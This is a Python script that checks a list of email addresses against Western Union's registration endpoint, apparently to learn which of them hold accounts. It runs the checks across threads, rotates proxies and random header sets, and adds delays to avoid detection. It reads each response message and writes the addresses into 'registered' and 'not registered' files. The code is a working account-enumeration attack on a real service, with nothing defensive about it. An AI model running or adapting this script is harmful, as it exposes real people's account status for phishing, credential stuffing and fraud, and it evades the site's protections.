import json
import queue
import urllib
import logging
import argparse
from threading import Thread, Lock, current_thread

from logger import log
from utils import random_delay, get_random_proxies_for_session
from random_requests import create_session_requests


parser = argparse.ArgumentParser()
parser.add_argument('-w', '--workers', type=int, default=4, help="Number of workers to be used")
parser.add_argument('--no-proxies', action='store_false', help="Flag to use proxies or not")

args = parser.parse_args()

NUMBER_OF_WORKERS = args.workers
USE_PROXIES = args.no_proxies

log.info('PROXIES: {}\n'.format('YES' if USE_PROXIES else 'NO'))

workers_data = queue.Queue()
lock = Lock()

RANDOM_REQUESTS = create_session_requests(USE_PROXIES)


def make_requests():
    global workers_data
    emails = open('data/emails.txt','r').read().splitlines()
    # Get a proxy for each email
    proxies = []
    if USE_PROXIES:
        proxies = get_random_proxies_for_session(len(emails))

    emails_per_workers = int(len(emails) / NUMBER_OF_WORKERS) + bool(len(emails) % NUMBER_OF_WORKERS)
    headers_per_workers = int(len(RANDOM_REQUESTS) / NUMBER_OF_WORKERS) + bool(len(RANDOM_REQUESTS) % NUMBER_OF_WORKERS)

    worker_headers = []
    worker_emails = []
    worker_proxies = []

    # Distribute header sets and emails equally between the workers
    for i in range(NUMBER_OF_WORKERS):
        start_h = i * headers_per_workers
        end_h = start_h + headers_per_workers

        worker_headers = RANDOM_REQUESTS[start_h:end_h]

        start_e = i * emails_per_workers
        end_e = start_e + emails_per_workers
        worker_emails = emails[start_e:end_e]
        worker_proxies = proxies[start_e:end_e]

        workers_data.put([worker_headers, worker_emails, worker_proxies])


def request_www_westernunion_com(prepared_requests, emails, proxies=[]):
    worker_name = current_thread().name
    emails_per_request = int(len(emails) / len(prepared_requests)) + bool(len(emails) % len(prepared_requests))

    for idx, prepared_request in enumerate(prepared_requests):
        subset_start = idx * emails_per_request
        subset_end = subset_start + emails_per_request 

        for k, email in enumerate(emails[subset_start:subset_end]):
            try:
                request, session_id = prepared_request
                
                body = json.dumps({
                    'email': email,
                    'security': {
                        'session': {
                            'id': session_id
                        },
                        'version': '2'
                    },
                    'bashPath': '/us/en'
                }).encode()


                random_delay(1, 2)

                # Add the proxy and send the request
                if proxies:
                    request.set_proxy(proxies[k], 'http')
                response = urllib.request.urlopen(request, body)

                # Parse the message
                data = response.fp.read()
                if data:
                    # Get the message from the response
                    msg = json.loads(data.decode('utf-8'))['error']['message']

                    # Email IS NOT registered
                    if "We can't find that email address" in msg:
                        log.info('{}: Not registered: {}'.format(worker_name, email))
                        with open('data/not_registered_emails.txt', 'a') as fp:
                            fp.write(email)
                    
                    # Email IS registered
                    elif "There's already an account with this email address" in msg:
                        log.info('{}: Registered: {}'.format(worker_name, email))
                        with open('data/registered_emails.txt', 'a') as fp:
                            fp.write(email)
                    
                    # Other message
                    else:
                        log.info('{}: {}'.format(worker_name, msg))
                
                # No data received in response
                else:
                    log.info('{}: Status: {}, Message: {}, Data: {}'.format(
                        worker_name, response.status, response.msg, data)
                    )
                    with open('data/failed_emails.txt', 'a') as fp:
                        fp.write(email)

            except urllib.error.URLError as e:
                logging.exception(e)

            except Exception as e:
                raise e



def worker():
    while True:
        with lock:
            data = workers_data.get()
        if not data:
            break
        requests, emails, proxies = data
        log.info('{} has: {} headers set, {} emails, {} proxies'.format(
            current_thread().name, len(requests), len(emails), len(proxies)))
        request_www_westernunion_com(requests, emails, proxies)
        log.info('{} finished'.format(current_thread().name))
        # workers_data.task_done()

make_requests()

threads = []
for i in range(NUMBER_OF_WORKERS):
    t = Thread(target=worker, name='worker {}'.format(i))
    t.start()
    threads.append(t)




# block until all tasks are done
# workers_data.join()

# Stop workers
for i in range(NUMBER_OF_WORKERS):
    workers_data.put(None)
for t in threads:
    t.join()









# def worker():
#     while True:
#         item = workers_data.get()
#         if item is None:
#             break
#         do_work(item)
#         workers_data.task_done()

# threads = []
# for i in range(NUMBER_OF_WORKERS):
#     t = threading.Thread(target=worker)
#     t.start()
#     threads.append(t)

# for item in source():
#     workers_data.put(item)

# # block until all tasks are done
# workers_data.join()

# # stop workers
# for i in range(NUMBER_OF_WORKERS):
#     workers_data.put(None)
# for t in threads:
#     t.join()